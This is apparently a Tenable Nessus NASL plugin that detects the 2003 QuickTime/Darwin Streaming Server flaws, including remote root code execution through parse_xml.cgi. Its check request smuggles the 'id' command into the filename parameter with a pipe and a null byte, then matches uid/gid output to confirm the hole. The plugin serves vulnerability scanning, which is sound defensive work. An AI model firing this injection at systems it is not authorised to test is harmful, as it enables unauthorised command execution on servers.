#
# This script is copyright (C) Tenable Network Security
#
# Original plugin was written by Michael Scheidell
#

desc = "
The remote host is running Apple QuickTime Streaming Server.

There are multiple flaws in this version :

* Remote code execution vulnerability (by default with root privileges)
* 2 Cross Site Scripting vulnerabilies
* Path Disclosure vulnerability
* Arbitrary Directory listing vulnerability 
* Buffer overflow in MP3 broadcasting module

See:
http://www.atstake.com/research/advisories/2003/a022403-1.txt

Solution:  Install patches from Apple or disable access to this service.
Risk factor : High";
 

if(description)
{
 script_id(11278);
 script_bugtraq_id(6954, 6955, 6956, 6957, 6958, 6960, 6990);
 script_version("$Revision: 1.15 $");
 
 script_cve_id("CVE-2003-0050","CVE-2003-0051","CVE-2003-0052","CVE-2003-0053","CVE-2003-0054","CVE-2003-0055");
 
 name["english"] = "Quicktime/Darwin Remote Admin Exploit";
 script_name(english:name["english"]);

 script_description(english:desc);
 
 summary["english"] = "Checks Quicktime/Darwin server for parse_xml.cgi";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl","no404.nasl");
 script_require_ports("Services/www", 1220);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');


if ( thorough_tests )
{
 extra_list = make_list ("/AdminHTML");
}
else
  extra_list = NULL;

http_check_remote_code (
			default_port:1220,
			extra_dirs: extra_list,
			check_request:"/parse_xml.cgi?action=login&filename=frameset.html|id%00|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
